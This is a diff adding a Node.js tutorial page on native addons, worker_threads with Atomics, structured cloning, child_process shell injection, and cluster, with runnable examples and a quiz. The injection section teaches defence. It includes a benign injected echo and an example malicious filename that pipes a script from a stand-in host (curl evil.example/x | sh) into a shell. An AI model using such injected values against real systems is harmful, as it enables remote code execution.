@@ -1,0 +1,250 @@
+---
+title: 'Native Code & Workers'
+description: 'N-API in one paragraph, worker_threads with SharedArrayBuffer/Atomics, MessageChannel, child_process injection, and cluster.'
+sidebar:
+  order: 5
+---
+
+import NodeRunner from '../../../../components/NodeRunner.tsx';
+import Callout from '../../../../components/Callout.astro';
+import Quiz from '../../../../components/Quiz.tsx';
+import ProgressTracker from '../../../../components/ProgressTracker.tsx';
+import Mermaid from '../../../../components/Mermaid.astro';
+import SpotTheBug from '../../../../components/SpotTheBug.astro';
+
+## Native addons, briefly
+
+A **native addon** is a compiled `.node` file (actually a shared library) that JavaScript can `require()` like any other module — used when a package needs to call a system library or squeeze out performance no amount of JS optimization reaches. **N-API** is the stable C ABI Node exposes for writing these, specifically so an addon compiled against one Node version keeps working on later versions without a rebuild. Most published native packages ship **prebuilds** (precompiled binaries for common platform/arch/Node-ABI combinations) and only fall back to compiling from source with **node-gyp** (which needs a C++ toolchain and Python installed) when no matching prebuild exists — this is exactly why `npm ci` sometimes takes noticeably longer or fails outright in a minimal Docker image: it is not installing JavaScript, it is compiling C++.
+
+## `worker_threads`: a real thread, a separate heap
+
+Each `Worker` is a genuine OS thread running its own V8 isolate — its own heap, its own event loop, its own globals. Nothing is shared by default; you opt in per piece of data.
+
+<Mermaid title="Main thread and workers each get their own everything, except what you explicitly share" code={`flowchart TB
+  Main["Main thread\nown V8 isolate, own event loop"] -->|"postMessage()\nstructured-clones the value"| W1["Worker 1\nown V8 isolate, own event loop"]
+  Main -->|"postMessage()\nstructured-clones the value"| W2["Worker 2\nown V8 isolate, own event loop"]
+  Main -.->|"SharedArrayBuffer\nsame underlying memory"| Shared[("shared memory")]
+  W1 -.-> Shared
+  W2 -.-> Shared
+`} />
+
+## Proving `SharedArrayBuffer` + `Atomics` has no lost updates
+
+Four workers each increment a shared counter 100,000 times. With a real `SharedArrayBuffer` and `Atomics.add` (an atomic read-modify-write), every increment counts — no lost updates, even with four threads hitting the same memory concurrently:
+
+export const atomicsCode = `import { Worker, isMainThread, workerData, parentPort } from 'node:worker_threads';
+
+if (isMainThread) {
+  const sab = new SharedArrayBuffer(4);
+  const view = new Int32Array(sab);
+  let done = 0;
+  for (let i = 0; i < 4; i++) {
+    const w = new Worker(new URL(import.meta.url), { workerData: { sab } });
+    w.on('message', () => {
+      done++;
+      if (done === 4) console.log('Atomics counter after 4 workers x 100,000 increments each:', Atomics.load(view, 0));
+    });
+  }
+} else {
+  const view = new Int32Array(workerData.sab);
+  for (let i = 0; i < 100000; i++) Atomics.add(view, 0, 1);
+  parentPort.postMessage('done');
+}
+`;
+
+export const atomicsOut = `Atomics counter after 4 workers x 100,000 increments each: 400000`;
+
+<NodeRunner client:visible code={atomicsCode} node expected={atomicsOut} />
+
+400,000 is the mathematically exact answer (4 × 100,000) — `Atomics.add` guarantees the read-modify-write happens as one indivisible step, so two workers can never both read the same value and each add to it, losing one of the increments the way a plain `view[0]++` on shared memory could.
+
+## The other half of the proof: `postMessage` copies, it does not share
+
+The common misconception this contrasts with is assuming `postMessage`/`workerData` shares an object by reference. It does not — every value crossing that boundary is passed through the **structured clone algorithm**, which makes an independent copy:
+
+export const structuredCloneCode = `import { Worker, isMainThread, workerData, parentPort } from 'node:worker_threads';
+
+if (isMainThread) {
+  const counter = { value: 0 }; // a plain object -- NOT a SharedArrayBuffer
+  let received = 0;
+  for (let i = 0; i < 4; i++) {
+    const w = new Worker(new URL(import.meta.url), { workerData: { counter } });
+    w.on('message', (finalValue) => {
+      received++;
+      console.log('worker reported its own copy at:', finalValue);
+      if (received === 4) console.log('main thread counter.value (never touched by any worker):', counter.value);
+    });
+  }
+} else {
+  const localCopy = workerData.counter; // workerData is structuredClone()'d -- a copy, not a reference
+  for (let i = 0; i < 100000; i++) localCopy.value++;
+  parentPort.postMessage(localCopy.value);
+}
+`;
+
+export const structuredCloneOut = `worker reported its own copy at: 100000
+worker reported its own copy at: 100000
+worker reported its own copy at: 100000
+worker reported its own copy at: 100000
+main thread counter.value (never touched by any worker): 0`;
+
+<NodeRunner client:visible code={structuredCloneCode} node expected={structuredCloneOut} />
+
+Each worker's copy reaches exactly 100,000 (no lost updates *within* a worker, since each has exclusive access to its own copy), but the main thread's original object is completely untouched — proof that `workerData`/`postMessage` never gave the workers a reference to the real object at all. `structuredClone()` (the same global function, usable directly) follows this same algorithm: it deep-copies most values (objects, arrays, Maps, Sets, dates, typed arrays) but cannot clone functions, DOM nodes and similar host objects, or (deliberately) classes with private fields that do not implement the algorithm — those throw a `DataCloneError`.
+
+`MessageChannel`/`MessagePort` is the same structured-clone-based messaging primitive `Worker` uses internally, exposed directly for building your own two-way channel — including between two ports each handed to a different worker, so workers can talk to each other without routing every message through the main thread.
+
+## `child_process`: `spawn`/`execFile` vs `exec`, and why it matters for injection
+
+`exec()` runs its command string through a real shell, which means shell metacharacters in that string are interpreted — including ones from untrusted input. `execFile()` (and `spawn()`) never invoke a shell for the command itself; arguments are passed as an array and reach the target program literally, with no metacharacter interpretation:
+
+export const execInjectionCode = `import { exec, execFile } from 'node:child_process';
+
+// A deliberately benign "attack" payload -- proves the point without doing anything harmful
+const userInput = 'hello; echo INJECTED';
+
+const execOut = await new Promise((resolve) => {
+  exec('echo ' + userInput, (err, stdout) => resolve(stdout.trim()));
+});
+console.log('exec() result:', JSON.stringify(execOut));
+
+const execFileOut = await new Promise((resolve) => {
+  execFile('echo', [userInput], (err, stdout) => resolve(stdout.trim()));
+});
+console.log('execFile() result:', JSON.stringify(execFileOut));
+`;
+
+export const execInjectionOut = `exec() result: "hello\\nINJECTED"
+execFile() result: "hello; echo INJECTED"`;
+
+<NodeRunner client:visible code={execInjectionCode} node expected={execInjectionOut} />
+
+`exec()` split the string on `;` and ran `echo INJECTED` as a second, real command — that is shell injection, demonstrated with a payload that only prints a word, but the exact same mechanism runs `rm -rf`, exfiltrates data, or opens a reverse shell if the input is adversarial instead of benign. `execFile()` handed `'hello; echo INJECTED'` to `echo` as one single literal argument — no shell involved, nothing to inject into. The rule: if any part of a command comes from outside your own source code, use `execFile`/`spawn` with an argument array, never `exec` with string concatenation.
+
+## `cluster`: multiple processes, one port
+
+`cluster` forks full OS processes (not threads) that share the same listening port via the primary process — a different scaling strategy from `worker_threads` (isolate CPU-bound work) or a reverse proxy (route across independent processes yourself):
+
+export const clusterCode = `import cluster from 'node:cluster';
+
+if (cluster.isPrimary) {
+  console.log('primary: forking 2 workers');
+  const workers = [cluster.fork(), cluster.fork()];
+  let exited = 0;
+  for (const w of workers) {
+    w.on('exit', (code) => {
+      exited++;
+      if (exited === 2) console.log('both workers exited with code', code);
+    });
+  }
+} else {
+  console.log('worker: doing its (simulated) job, then exiting cleanly');
+  process.exit(0);
+}
+`;
+
+export const clusterOut = `primary: forking 2 workers
+worker: doing its (simulated) job, then exiting cleanly
+worker: doing its (simulated) job, then exiting cleanly
+both workers exited with code 0`;
+
+<NodeRunner client:visible code={clusterCode} node expected={clusterOut} />
+
+In a real server, each `cluster` worker runs the full application and the primary process round-robins (or, on some platforms, lets the OS load-balance) incoming connections across them — a way to use multiple CPU cores for an I/O-heavy Node server without any `worker_threads` code, at the cost of each worker being a fully separate process with its own memory (no shared in-process cache without an external store like Redis).
+
+## Mental Model
+
+`worker_threads` is renting a second, fully furnished apartment (its own V8 isolate, own heap, own event loop) — nothing from your apartment is there unless you explicitly ship it over, either as a copy (`postMessage`, structured clone) or by handing over a key to one shared room (`SharedArrayBuffer`). `child_process` is not renting an apartment in the same building at all — it is calling a completely different tenant on the phone (`execFile`/`spawn`) or, with `exec`, handing a stranger (the shell) a note and trusting them to read it exactly as written, which is exactly the trust `exec` breaks when the note contains someone else's words.
+
+## Trade-offs
+
+Threads (`worker_threads`) are cheaper to spin up than processes and can share memory directly via `SharedArrayBuffer`, but a crash that takes down the whole process takes every worker with it, and `Atomics`-based shared-memory code is genuinely harder to get right than message-passing. Processes (`cluster`, `child_process`) are fully isolated — one crashing does not affect the others — at the cost of more memory overhead per instance and no free shared state; anything two processes need in common (a cache, a session store) has to live somewhere both can reach, like Redis. `exec`'s shell access is strictly more powerful than `execFile`'s direct-exec (pipes, globs, env expansion all work), which is exactly the surface area that makes it dangerous with any input you do not fully control yourself.
+
+## Common Misconceptions
+
+- **"`postMessage` shares the object between threads."** It structured-clones it — the receiving side gets an independent copy. Only a `SharedArrayBuffer` (accessed through a typed array) is genuinely shared memory.
+- **"`Atomics` is only about performance."** Its actual job is correctness: without it, concurrent reads/writes to shared memory from multiple threads can interleave and lose updates. It happens to also enable low-level coordination primitives (`Atomics.wait`/`notify`), but the core guarantee is atomicity, not speed.
+- **"`execFile` is just a slower, safer version of `exec`."** It is not slower for equivalent work — it simply never spawns a shell for the target command. The safety difference is a direct consequence of skipping shell parsing entirely, not a performance trade-off.
+
+## Reading AI-generated code
+
+Generated code that shells out to run a system command is one of the highest-value things to check carefully, because the injection risk is invisible unless you know to look at *how* the command is built.
+
+<SpotTheBug code={`// AI-written "resize an uploaded image" helper
+import { exec } from 'node:child_process';
+
+function resizeImage(filename, width) {
+  exec(\`convert uploads/\${filename} -resize \${width} output/\${filename}\`, (err) => {
+    if (err) console.error('resize failed', err);
+  });
+}
+// filename comes from the original upload's filename, sent by the client
+`}>
+`filename` is attacker-controlled (it is whatever name the uploader's browser sent) and gets interpolated directly into a string that `exec` runs through a real shell. A filename like `` a.png; curl evil.example/x | sh `` runs an entirely separate, attacker-chosen command after the semicolon — classic shell injection, not a hypothetical. The fix is `execFile('convert', ['uploads/' + filename, '-resize', String(width), 'output/' + filename], callback)`, which passes each argument literally with no shell involved, plus validating/sanitizing `filename` before it ever touches the filesystem at all (reject path separators and null bytes at minimum).
+</SpotTheBug>
+
+<Callout title="The one-line takeaway">
+SharedArrayBuffer + Atomics is real shared memory with no lost updates; postMessage/workerData is always a copy; and exec() with any input you do not fully control is shell injection waiting for the right payload -- use execFile/spawn instead.
+</Callout>
+
+export const quizNativeWorkers = [
+  {
+    q: 'What does each worker_threads Worker get that is NOT shared with the main thread by default?',
+    options: [
+      'Nothing -- workers share the main thread\'s heap and event loop',
+      'Its own V8 isolate: its own heap, its own event loop, its own globals',
+      'Only its own event loop, but the heap is shared',
+      'Only its own heap, but the event loop is shared',
+    ],
+    answer: 1,
+    explain: 'A Worker is a real OS thread running a fully separate V8 isolate -- own heap, own event loop, own globals. Sharing anything (data or memory) requires an explicit mechanism: postMessage (copy) or SharedArrayBuffer (real sharing).',
+  },
+  {
+    q: 'Four workers each run this 100,000 times on a shared Int32Array:\n```js\nAtomics.add(view, 0, 1);\n```\nWhat is the final value, and why?',
+    options: [
+      'Exactly 400,000 -- Atomics.add is an indivisible read-modify-write, so no increment is ever lost',
+      'Usually less than 400,000, because concurrent writes lose updates',
+      'Exactly 100,000 -- only one worker\'s writes actually take effect',
+      'It is undefined behavior and could be any value',
+    ],
+    answer: 0,
+    explain: 'Atomics operations are guaranteed atomic across threads sharing the same SharedArrayBuffer -- unlike a plain view[0]++, two threads can never both read the same value and each add to it, so the total is always exact.',
+  },
+  {
+    q: 'A worker receives `workerData: { counter }` where counter is a plain object, mutates counter.value 100,000 times, and posts the result back. What happens to the main thread\'s original counter object?',
+    options: [
+      'It also reaches value 100,000, since workerData shares the reference',
+      'It is unaffected -- workerData is passed through the structured clone algorithm, so the worker only ever had an independent copy',
+      'It throws a DataCloneError',
+      'It becomes undefined',
+    ],
+    answer: 1,
+    explain: 'workerData (like postMessage payloads generally) is structured-cloned, not shared by reference -- the worker mutates its own copy, and the main thread\'s object is never touched.',
+  },
+  {
+    q: 'Why is the first line vulnerable to injection but not the second, for the exact same userInput?\n```js\nexec("echo " + userInput);\nexecFile("echo", [userInput]);\n```',
+    options: [
+      'exec() is simply an older, buggier function with no real difference in behavior',
+      'exec() runs the whole string through a real shell, which interprets metacharacters like ; and | in userInput; execFile() passes userInput as one literal argument with no shell involved',
+      'execFile() automatically escapes shell metacharacters in every argument',
+      'There is no actual difference -- both are equally vulnerable',
+    ],
+    answer: 1,
+    explain: 'The vulnerability is entirely about shell involvement: exec() hands the full string to a shell for parsing (so ";", "|", "&&", etc. all do what they normally do in a shell), while execFile()/spawn() invoke the target program directly with an argument array, bypassing shell parsing.',
+  },
+  {
+    q: 'What does node:cluster actually fork?',
+    options: [
+      'Lightweight threads within the same process, like worker_threads',
+      'Full separate OS processes, which share a listening port via the primary process',
+      'A single thread that round-robins callbacks',
+      'It does not fork anything -- it just adds more event loop phases',
+    ],
+    answer: 1,
+    explain: 'cluster.fork() creates real child processes (each running the full application), coordinated by the primary process so they can share one listening port -- a process-level scaling strategy, distinct from worker_threads\' thread-level one.',
+  },
+];
+
+<Quiz client:visible id="runtime-internals/native-and-workers" questions={quizNativeWorkers} />
+
+<ProgressTracker client:visible id="runtime-internals/native-and-workers" />
